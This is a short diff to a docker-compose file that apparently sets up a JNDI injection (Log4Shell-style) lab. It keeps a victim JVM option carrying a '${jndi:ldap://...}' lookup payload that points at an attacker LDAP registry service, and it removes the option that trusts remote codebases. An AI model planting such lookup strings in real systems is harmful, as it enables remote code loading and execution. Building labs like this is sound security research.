@@ -11,7 +11,6 @@ services:
     environment:
       JAVA_OPTS: >-
         -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
-        -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
     depends_on:
       - attacker_ldap_registry
       - attacker_ldap_registry_setup
